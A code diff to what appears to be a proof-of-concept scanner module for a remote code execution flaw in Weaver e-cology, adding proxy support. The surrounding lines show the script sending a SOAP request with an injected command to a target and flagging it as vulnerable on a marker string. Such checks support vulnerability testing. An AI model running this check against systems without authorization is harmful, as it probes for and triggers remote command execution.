@@ -3,9 +3,8 @@
 
 import requests
 import sys
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-
-
+from Config.config_proxies import proxies
+requests.packages.urllib3.disable_warnings()
 ########################################################################################################################
 # 脚本信息
 NAME='Weaver_e_Cology_RCE'
@@ -38,8 +37,8 @@ def poc(target):
        </soapenv:Body>
     </soapenv:Envelope>'''.format(cmd=cmd)
     try:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-        r = requests.post(url,headers=headers,data=data,verify=False,timeout=5)
+
+        r = requests.post(url,headers=headers,data=data,verify=False,timeout=5,proxies=proxies)
         if "VulTest" in r.text and r.status_code == 500:
             result['target'] = target
             result['poc'] = NAME
